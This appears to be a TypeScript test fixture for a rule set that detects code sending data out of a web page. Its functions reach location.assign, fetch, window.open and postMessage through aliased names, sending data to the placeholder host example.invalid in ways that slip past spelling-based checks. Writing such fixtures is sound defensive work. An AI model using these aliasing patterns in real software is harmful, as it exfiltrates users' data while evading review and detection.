/**
 * The ways out that start from a name of their own (X1b, the review of #398 L-4): `const w: any = window; w.location.assign(url)` went through every rule of the proof, because the rules look for
 * `location.assign` and `window.open` by their spelling and a variable has another. Each function here has one. Nothing imports this file but the proof's own test, and nothing runs it.
 */

export function throughWindow(data: string): void {
  const w: any = window;
  const loc = w.location;
  loc.assign(`https://example.invalid/?${data}`);
}

export function throughDocument(data: string): void {
  const where = document.location;
  where.href = `https://example.invalid/?${data}`;
  document.defaultView!.fetch(`https://example.invalid/?${data}`);
}

export function throughGlobalThis(data: string): void {
  const g = globalThis as any;
  g.fetch(`https://example.invalid/?${data}`);
}

export function throughTheFrames(data: string): void {
  (top as any).location = `https://example.invalid/?${data}`;
  parent.postMessage(data, "*");
  const opened = (self as any).open;
  opened(`https://example.invalid/?${data}`);
}

export function throughALocationOfItsOwn(data: string): void {
  const { location } = window;
  const go = location.assign.bind(location);
  go(`https://example.invalid/?${data}`);
}

export function throughHistoryAndNavigator(data: string): void {
  history.pushState(null, "", `/?${data}`);
  const nav = navigator;
  void nav;
}

/** What is allowed, and stays so: a name that is only a property, and the one use of document the download has. */
export function allowed(box: { top: number; parent: string }): number {
  const anchor = document.createElement("a");
  anchor.download = "file.csv";
  return box.top + box.parent.length;
}
